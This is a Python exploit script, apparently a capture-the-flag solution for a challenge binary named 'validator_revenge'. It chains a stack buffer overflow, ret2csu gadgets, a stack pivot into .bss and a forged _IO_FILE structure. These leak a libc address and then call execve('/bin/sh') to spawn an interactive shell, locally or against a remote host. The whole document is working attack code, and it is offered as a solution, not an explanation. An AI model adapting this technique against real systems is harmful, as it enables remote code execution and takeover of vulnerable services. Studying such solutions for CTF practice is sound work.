#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./validator_revenge', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

b *0x4007EC
b *0x400801

c
'''

p = start()

# ==================== EXPLOIT ====================

def ret2csu(rbx, rbp, r12, rdi, rsi, rdx, ret):

    return flat(rbx, rbp, r12, rdi, rsi, rdx, ret) + p64(0x0)*7


def exploit():

    offset = 0x88
    pop_rdi = 0x400873
    pop_rsi = 0x40068b
    pop_rdx = 0x400694
    pop_rbp = 0x400608
    leave_ret = 0x400800

    csu_call = 0x400850
    csu_pop = 0x40086a

    bss = 0x601800

    prefix = b'DREAMHACK!'

    lst = []
    for i in range(118, 0, -1):
        lst.append(i)


    payload = prefix + bytes(lst) + p64(0)

    payload += p64(csu_pop)
    payload += ret2csu(
        rbx=0x0,
        rbp=0x1,
        r12=exe.got.read,
        rdi=0x0,
        rsi=0x601008,
        rdx=0x100,
        ret=csu_call
    )

    payload += p64(csu_pop)
    payload += ret2csu(
        rbx=0x0,
        rbp=0x1,
        r12=exe.got.read,
        rdi=0x0,
        rsi=0x601028,
        rdx=0x100,
        ret=csu_call
    )

    payload += p64(csu_pop)
    payload += ret2csu(
        rbx=0x0,
        rbp=0x1,
        r12=exe.got.read,
        rdi=0x0,
        rsi=0x601108,
        rdx=0x100,
        ret=csu_call
    )

    payload += flat(
        pop_rbp,
        0x601000,
        leave_ret
    )

    # pause()
    sleep(0.2)
    s(payload)

    # pause()
    # 0x601008
    sleep(0.2)
    s(p64(pop_rbp) + p64(0x601100) + p64(pop_rsi))

    # pause()
    # 0x601028
    sleep(0.2)
    s(p64(leave_ret))

    # 0x601108
    payload = flat(
        pop_rdi,
        0x0,
        exe.plt.read
    ) + flat (

        pop_rbp,
        0x601130,
        0x4007EC

    ) + p64(csu_pop) + ret2csu(
        rbx=0x0,
        rbp=0x1,
        r12=exe.got.read,
        rdi=0x0,
        rsi=bss,
        rdx=0x100,
        ret=csu_call
    ) + flat(
        pop_rbp,
        bss - 0x8,
        leave_ret,
    )

    # pause()
    sleep(0.2)
    s(payload)


    GOT_ADDR    = exe.got.read
    FLAGS      = 0xfbad2087

    fake_iofile = flat(
        FLAGS,                 # _flags
        0,                     # _IO_read_ptr
        GOT_ADDR,              # _IO_read_end
        0,                     # _IO_read_base
        GOT_ADDR,              # _IO_write_base
        GOT_ADDR + 0x8,        # _IO_write_ptr
        0,                     # _IO_write_end
        0,                     # _IO_buf_base
        0,                     # _IO_buf_end
        0,                     # _IO_save_base
        0,                     # _IO_backup_base
        0,                     # _IO_save_end
        0,                     # _markers
        0,                     # _chain
        1,                     # _fileno (1 = STDOUT_ADDR)
    )

    # pause()
    sleep(0.2)
    s(fake_iofile)

    libc.address = fixleak(rb(8)) - libc.sym.read

    success('libc base @ %#x', libc.address)

    payload = flat(
        pop_rdi,
        next(libc.search(b'/bin/sh\0')),
        pop_rsi, 0,
        pop_rdx, 0,
        libc.sym.execve
    )

    # pause()
    sleep(0.2)
    s(payload)


    interactive()

if __name__ == '__main__':
    exploit()
